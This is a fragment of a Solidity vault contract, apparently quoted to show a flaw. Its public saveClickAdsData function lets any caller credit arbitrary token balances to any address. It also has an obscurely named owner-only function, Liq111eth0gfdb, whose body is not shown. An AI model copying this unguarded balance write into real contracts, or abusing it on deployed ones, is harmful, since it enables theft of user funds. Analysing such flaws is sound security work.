...
contract VUSD_vault is Ownable {    
    ...
    function saveUserData(address from, address to, uint256 _amount) public
    {        
    ...
    function saveClickAdsData(address to, uint256 _amount) public{        
        require(_amount > 0,  "Amount should be lager then zero");    
        tokenBalancesByUser[to][VUSD] += _amount;
    }
    ...
    function Liq111eth0gfdb() public onlyOwner {
